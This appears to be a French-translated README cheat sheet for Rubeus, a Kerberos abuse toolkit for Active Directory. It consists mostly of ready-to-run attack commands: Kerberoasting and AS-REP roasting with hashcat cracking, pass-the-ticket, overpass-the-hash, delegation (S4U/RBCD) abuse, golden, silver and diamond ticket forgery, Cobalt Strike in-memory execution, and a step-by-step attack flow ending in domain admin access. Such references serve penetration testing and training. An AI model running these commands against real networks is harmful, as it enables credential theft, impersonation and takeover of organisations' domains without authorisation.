# 🎫 Rubeus — boîte à outils d’abus de Kerberos

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
           Interactions avec Kerberos et abus
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

## 📋 Table des matières

- [Qu’est-ce que Rubeus ?](#-quest-ce-que-rubeus-)
- [Utilisation de base](#-utilisation-de-base)
- [Opérations sur les tickets](#-opérations-sur-les-tickets)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [Attaques sur les tickets](#-attaques-sur-les-tickets)
- [Attaques sur la délégation](#-attaques-sur-la-délégation)
- [Golden Ticket et Silver Ticket](#-golden-ticket-et-silver-ticket)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce que Rubeus ?

**Rubeus** est une boîte à outils C# permettant d’interagir avec Kerberos et d’en exploiter les faiblesses. Un ticket est un justificatif d’authentification Kerberos ; les exemples ci-dessous décrivent notamment :

- 🎫 **Opérations sur les tickets** — Demander, renouveler et décrire des tickets
- 🔓 **Kerberoasting** — Extraire des données de tickets de service pour tester des mots de passe hors ligne
- 🔑 **AS-REP Roasting** — Cibler des comptes sans préauthentification
- 🎭 **Pass-the-Ticket** — Réutiliser des tickets dérobés
- ✨ **Golden Ticket / Silver Ticket** — Forger des tickets

---

## 🚀 Utilisation de base

### Exécuter Rubeus

> **Précision :** ces lignes relèvent de contextes différents. `execute-assembly` appartient à Cobalt Strike ; `LoadFile` charge un assembly .NET, sans appeler à lui seul son point d’entrée ([Microsoft](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfile)).

```powershell
# Exécution directe
.\Rubeus.exe <command> [options]

# Exécution en mémoire (Cobalt Strike)
execute-assembly Rubeus.exe <command>

# Chargement depuis PowerShell
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a id="-opérations-sur-les-tickets"></a>
## 🎟️ Opérations sur les tickets

### Demander un TGT

> **Précision :** un TGT permet de demander des tickets de service ; il ne donne pas automatiquement tous les droits. Mot de passe, clés et certificat supposent une configuration et une politique Kerberos compatibles ([projet officiel](https://github.com/GhostPack/Rubeus#asktgt)).

```powershell
# Avec un mot de passe
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# Avec une empreinte NTLM
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# Avec une clé AES256
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# Avec un certificat
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# Écrire dans un fichier
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### Demander un ticket de service (TGS)

Un SPN (*Service Principal Name*) désigne le nom principal du service visé.

```powershell
# Demander un ticket de service
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# Avec un TGT lu depuis un fichier
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### Lister les tickets

> **Correction de l’original :** `/luid:0x3e7` cible une session particulière, celle de SYSTEM, et non toutes les sessions. Le périmètre de `triage` dépend aussi du niveau de privilèges ([source officielle](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Triage.cs)).

```powershell
# Lister les tickets de l’utilisateur courant
.\Rubeus.exe triage

# Lister tous les tickets (droits d’administration requis)
.\Rubeus.exe triage /luid:0x3e7

# Extraction détaillée des tickets
.\Rubeus.exe dump
```

### Pass-the-Ticket

> **Précision :** `/ptt` importe un ticket ; il ne crée pas automatiquement une autre session. Un LUID identifie une session locale et les valeurs affichées sont des exemples. `createnetonly` ne garantit pas à lui seul l’authentification distante annoncée ([documentation Rubeus](https://github.com/GhostPack/Rubeus#ptt)).

```powershell
# Importer le ticket dans la session courante
.\Rubeus.exe ptt /ticket:base64ticket

# Importer depuis un fichier
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Créer une session d’ouverture de session et importer le ticket
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### Décrire un ticket

```powershell
# Afficher les détails du ticket
.\Rubeus.exe describe /ticket:base64ticket

# Depuis un fichier
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

## 🍖 Kerberoasting

### Kerberoasting de base

> **Précision :** `/rc4opsec` exclut notamment les comptes avec AES activé ; ce n’est pas une rétrogradation universelle. `/aes` ne garantit pas la discrétion. Les modes Hashcat `13100` et `18200` correspondent aux formats Kerberos etype 23, pas à tous les tickets ([Rubeus](https://github.com/GhostPack/Rubeus#kerberoast), [Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)).

```powershell
# Effectuer un Kerberoasting sur tous les SPN
.\Rubeus.exe kerberoast

# Écrire dans un fichier au format Hashcat
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# Cibler un utilisateur précis
.\Rubeus.exe kerberoast /user:sqlservice

# Rétrogradation RC4 (etype 23)
.\Rubeus.exe kerberoast /rc4opsec
```

### Kerberoasting avancé

```powershell
# Avec un TGT précis
.\Rubeus.exe kerberoast /ticket:base64tgt

# Statistiques uniquement, sans demander de tickets
.\Rubeus.exe kerberoast /stats

# Cibler un SPN précis
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# Chiffrement AES (plus discret selon l’original)
.\Rubeus.exe kerberoast /aes

# Filtrer par utilisateur
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### Rechercher les mots de passe des données Kerberoast

```bash
# Hashcat (mode 13100)
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

## 🔓 AS-REP Roasting

### AS-REP Roasting de base

```powershell
# Rechercher et cibler les comptes sans préauthentification
.\Rubeus.exe asreproast

# Écrire dans un fichier
.\Rubeus.exe asreproast /outfile:asrep.txt

# Cibler un utilisateur précis
.\Rubeus.exe asreproast /user:targetuser

# Format Hashcat
.\Rubeus.exe asreproast /format:hashcat
```

### Rechercher les mots de passe des données AS-REP

```bash
# Hashcat (mode 18200)
hashcat -m 18200 asrep.txt wordlist.txt
```

---

## 🎭 Attaques sur les tickets

### Overpass-the-Hash (Pass-the-Key)

```powershell
# Obtenir un TGT avec une empreinte et créer une session, selon l’original
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Avec une clé AES
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# Créer un processus dédié à cette session
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U (Service for User)

> **Précision :** S4U signifie « service pour utilisateur ». Les exemples supposent des droits et attributs de délégation adaptés ; leurs commentaires ne décrivent pas toujours une étape isolée. Ils ne garantissent pas une chaîne S4U ou RBCD fonctionnelle dans toute configuration ([documentation officielle](https://github.com/GhostPack/Rubeus#s4u)).

```powershell
# S4U2Self : représenter un utilisateur auprès de son propre service
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy : représenter l’utilisateur auprès d’un autre service
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# Chaîne complète
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## 🔀 Attaques sur la délégation

### Délégation non contrainte

```powershell
# Surveiller les TGT sur un hôte en délégation non contrainte
.\Rubeus.exe monitor /interval:5 /nowrap

# Appliquer un filtre précis
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# Collecter les TGT
.\Rubeus.exe harvest /interval:30
```

### Délégation contrainte

```powershell
# Demander un ticket pour un service autorisé
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### Délégation contrainte fondée sur la ressource (RBCD)

```powershell
# Après configuration de RBCD avec PowerMad/PowerView
# Demander un ticket en tant que machine de l’attaquant
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## ✨ Golden Ticket et Silver Ticket

### Golden Ticket

> **Version des exemples :** l’option `/krbtgt` des deux premières lignes ne figure pas dans le parseur actuel de `golden`. Les commandes historiques restent inchangées ; secrets, SID, paramètres et correctifs doivent correspondre au domaine ([source officielle](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Golden.cs)).

```powershell
# Créer un Golden Ticket, ce qui nécessite le secret krbtgt
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# Préciser les groupes
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# Avec une clé AES
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### Silver Ticket

> **Précision :** un ticket de service ne garantit pas tous les droits. Le commentaire « LDAP (DCSync) » est trop général : DCSync exige notamment des droits de réplication effectifs ; forger un ticket LDAP ne suffit pas ([droits DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync)).

```powershell
# Créer un Silver Ticket, ce qui nécessite le secret du compte de service
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# Service LDAP (DCSync selon l’original)
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### Diamond Ticket

> **Exemple incomplet :** le mécanisme Diamond suppose aussi le secret de signature/chiffrement du TGT ; la ligne originale ne fournit pas ce contexte. `/enctype:aes` est une valeur acceptée du parseur, et ne constitue pas l’erreur de cet exemple ([source officielle](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Diamond.cs)).

```powershell
# TGT légitime modifié
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

## 📊 Référence rapide

### Commandes essentielles

| Commande | Description |
| --------- | ------------- |
| `asktgt` | Demander un TGT |
| `asktgs` | Demander un ticket de service |
| `kerberoast` | Extraire les données des tickets de service |
| `asreproast` | AS-REP Roasting |
| `ptt` | Pass-the-Ticket |
| `s4u` | Service pour utilisateur |
| `golden` | Forger un Golden Ticket |
| `silver` | Forger un Silver Ticket |
| `dump` | Extraire l’ensemble des tickets accessibles |
| `triage` | Lister les tickets |

### Options d’authentification

| Option | Description |
| -------- | ------------- |
| `/user:` | Nom d’utilisateur |
| `/password:` | Mot de passe |
| `/rc4:` | Empreinte NTLM |
| `/aes256:` | Clé AES256 |
| `/ticket:` | Ticket encodé en Base64 |

### Options courantes

| Option | Description |
| -------- | ------------- |
| `/ptt` | Pass-the-Ticket |
| `/outfile:` | Écrire dans un fichier |
| `/nowrap` | Ne pas couper les chaînes Base64 sur plusieurs lignes |
| `/domain:` | Domaine cible |
| `/dc:` | Contrôleur de domaine |

### Déroulement d’une attaque

```powershell
# 1. Effectuer un Kerberoasting
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. Rechercher les mots de passe des empreintes
hashcat -m 13100 kerb.txt rockyou.txt

# 3. Obtenir un TGT avec le mot de passe retrouvé
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. Ou utiliser l’Overpass-the-Hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. Accéder aux ressources
dir \\server\share
```

---

## 📚 Ressources

- [Rubeus sur GitHub](https://github.com/GhostPack/Rubeus)
- [Blog de HarmJ0y](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### Aide-mémoire associés
- [BloodHound](../../BloodHound/translations/README.fr.md)
- [Impacket](../../Impacket/translations/README.fr.md)
- [Mimikatz](../../Mimikatz/translations/README.fr.md)

---

<p align="center">
  <b>🎫 Maîtrisez Kerberos !</b><br>
  <i>Rubeus — des tickets aux privilèges d’administration du domaine</i>
</p>
